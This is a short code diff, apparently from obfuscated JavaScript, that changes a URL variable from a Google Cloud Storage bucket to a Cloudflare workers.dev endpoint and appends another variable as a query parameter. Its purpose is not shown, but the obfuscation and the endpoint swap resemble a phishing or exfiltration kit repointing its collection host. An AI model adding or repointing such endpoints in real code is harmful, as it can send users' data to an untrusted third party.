@@ -61,7 +61,7 @@ function nts316(min)
 dro73 = false; 
 
 
-     ekw28 = "https://storage.googleapis.com/tianjin/"+ak765;
+     ekw28 = "https://wild-violet-a269.sagatana.workers.dev/?"+ak765;
 
 
 ekw282 = ekw28;
